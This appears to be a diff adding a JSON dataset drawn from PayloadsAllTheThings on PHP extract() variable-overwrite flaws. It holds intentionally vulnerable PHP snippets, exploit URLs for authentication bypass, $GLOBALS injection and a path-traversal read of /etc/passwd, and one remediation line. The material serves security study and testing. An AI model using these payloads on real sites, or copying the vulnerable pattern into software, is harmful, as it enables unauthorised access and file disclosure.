@@ -1,0 +1,55 @@
+{
+  "category": "External Variable Modification",
+  "source": "PayloadsAllTheThings/External Variable Modification/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What it is and where to look",
+      "language": "text",
+      "tags": ["php", "extract", "methodology"],
+      "body": "The PHP functions extract($_GET/$_POST), import_request_variables(), parse_str() and register_globals import user input into the current variables.\nextract() defaults to EXTR_OVERWRITE -> it OVERWRITES existing variables with the same name.\nImpact: bypassing logic/authentication, a gadget for LFI and RCE. Look in the source for extract($_GET) and the like."
+    },
+    {
+      "subcategory": "Variable overwrite",
+      "title": "Vulnerable code - authentication bypass",
+      "language": "php",
+      "tags": ["php", "extract", "auth-bypass"],
+      "body": "<?php\n    $authenticated = false;\n    extract($_GET);\n    if ($authenticated) {\n        echo \"Access granted!\";\n    } else {\n        echo \"Access denied!\";\n    }\n?>"
+    },
+    {
+      "subcategory": "Variable overwrite",
+      "title": "Exploitation - set $authenticated",
+      "language": "text",
+      "tags": ["php", "auth-bypass"],
+      "body": "http://example.com/vuln.php?authenticated=true\nhttp://example.com/vuln.php?authenticated=1"
+    },
+    {
+      "subcategory": "Poisoning File Inclusion",
+      "title": "Vulnerable code - controlling the include path",
+      "language": "php",
+      "tags": ["php", "lfi", "extract"],
+      "body": "<?php\n    $page = \"config.php\";\n    extract($_GET);\n    include \"$page\";\n?>"
+    },
+    {
+      "subcategory": "Poisoning File Inclusion",
+      "title": "Exploitation - swapping $page for LFI",
+      "language": "text",
+      "tags": ["php", "lfi"],
+      "body": "http://example.com/vuln.php?page=../../etc/passwd"
+    },
+    {
+      "subcategory": "Global Variable Injection",
+      "title": "Overwriting $GLOBALS",
+      "language": "text",
+      "tags": ["php", "globals"],
+      "body": "In the code: extract($_GET);\n\nAttack:\nhttp://example.com/vuln.php?GLOBALS[admin]=1\n\nNote: as of PHP 8.1.0, writing to the entire $GLOBALS array is no longer supported."
+    },
+    {
+      "subcategory": "Protection",
+      "title": "Protection - EXTR_SKIP",
+      "language": "php",
+      "tags": ["php", "remediation"],
+      "body": "extract($_GET, EXTR_SKIP); // do not overwrite existing variables"
+    }
+  ]
+}
